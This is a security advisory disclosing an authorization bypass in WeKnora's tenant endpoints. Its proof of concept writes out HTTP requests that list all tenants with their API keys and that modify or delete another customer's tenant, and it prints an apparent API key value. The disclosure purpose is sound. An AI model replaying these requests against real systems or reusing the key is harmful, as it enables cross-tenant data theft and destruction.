# WeKnora Vulnerable to Broken Access Control in Tenant Management

**GHSA**: GHSA-ccj6-79j6-cq5q | **CVE**: CVE-2026-30855 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-284

**Affected Packages**:
- **github.com/Tencent/WeKnora** (go): <= 0.3.1

## Description

### Summary
An authorization bypass in tenant management endpoints of WeKnora application allows any authenticated user to read, modify, or delete any tenant by ID. Since account registration is open to the public, this vulnerability allows any unauthenticated attacker to register an account and subsequently exploit the system. This enables cross-tenant account takeover and destruction, making the impact critical.

### Details
The tenant management handlers do not validate that the caller owns the tenant or has cross-tenant privileges. The handlers parse the tenant ID from the path and directly call the service layer with that ID, returning or mutating the tenant without authorization checks.

Affected handlers:
- `GET /api/v1/tenants` lists all tenants without ownership checks
- `GET /api/v1/tenants/{id}` reads any tenant by ID without ownership checks
- `PUT /api/v1/tenants/{id}` allows updating any tenant by ID without ownership checks
- `DELETE /api/v1/tenants/{id}` allows deleting any tenant by ID without ownership checks

These endpoints do not enforce cross-tenant permissions or deny-by-default behavior, unlike `ListAllTenants` and `SearchTenants`.

### PoC
1) Register a new account as a user in Tenant 10025 and obtain a bearer token or API key.

2) Read details of other tenants:

  - Request that uses API key via the `X-API-Key` header:

    ```http
    GET /api/v1/tenants HTTP/1.1
    Host: localhost
    Connection: keep-alive
    X-Request-ID: 2TpH2S0sHyi1
    X-API-Key: sk--HmGzVTrUW-p334ddZzJnucebiWBZ63AH5qKVO0EY4QNrELd
    sec-ch-ua-platform: "macOS"
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
    Accept: application/json, text/plain, */*
    sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
    sec-ch-ua-mobile: ?0
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: https://weknora.serviceme.top/platform/knowledge-bases
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-US,en;q=0.9


    ```


  - Response (truncated for brevity):

    ```http
    HTTP/1.1 200 OK
    Server: nginx/1.28.0
    Date: Fri, 06 Feb 2026 03:12:22 GMT
    Content-Type: application/json; charset=utf-8
    Connection: close
    X-Request-Id: 2TpH2S0sHyi1
    X-Frame-Options: SAMEORIGIN
    X-Content-Type-Options: nosniff
    X-XSS-Protection: 1; mode=block
    Referrer-Policy: strict-origin-when-cross-origin

    {
        "data": {
            "items": [
                {
                    "id": 10025,
                    "name": "injokerr's Workspace",
                    "api_key": "sk--HmGzVTrUW-p334ddZzJnucebiWBZ63AH5qKVO0EY4QNrELd",
                    "status": "active"
                },
                {
                    "id": 10001,
                    "name": "viaim_yuweilong",
                    "api_key": "sk-<EXAMPLE_API_KEY_REDACTED>",
                    "status": "active"
                }
            ]
        },
        "success": true
    }
    ...
    ```

With API keys, we can do anything on the victim account's behalf, including reading sensitive data (LLM API keys, knowledge bases), modifying configurations, etc.

Requests to perform modification and deletion of another tenant.

1) Modify the victim tenant:

- Request:
  - Method: `PUT`
  - URL: `http://localhost:8088/api/v1/tenants/10001`
  - Header: `Authorization: Bearer <ATTACKER_TOKEN>`
  - Body: `{ "name": "HACKED by tenant 10025" }`

- Expected response:
  - `200 OK` with the updated tenant object.

4) Delete the victim tenant:

- Request:
  - Method: `DELETE`
  - URL: `http://localhost:8088/api/v1/tenants/10001`
  - Header: `Authorization: Bearer <ATTACKER_TOKEN>`

- Expected response:
  - `200 OK` and the tenant is deleted.

### Impact

This is a Broken Access Control (BOLA/IDOR) vulnerability in tenant management of WeKnora. Any user can access, modify, or delete tenants belonging to other customers, resulting in cross-tenant data exposure, account takeover, and destructive actions against other tenants. Moreover, when the account is taken over, attacker can read configured models to unauthorizedly extract sensitive data such as API keys of LLM services.
